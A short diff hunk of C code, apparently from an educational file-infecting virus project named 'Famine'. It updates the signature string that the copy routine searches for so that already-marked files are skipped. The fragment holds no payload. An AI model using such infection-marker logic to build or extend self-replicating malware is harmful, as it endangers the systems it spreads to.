@@ -29,7 +29,7 @@ int copy_file(t_woody *woody, char *filename)
 	char *string = woody->addr;
 	for (int i = 0; i < woody->filesize; i++)
 	{
-		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye", 45) != NULL)
+		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 53) != NULL)
 		{
 			return ERROR_CODE;
 		}
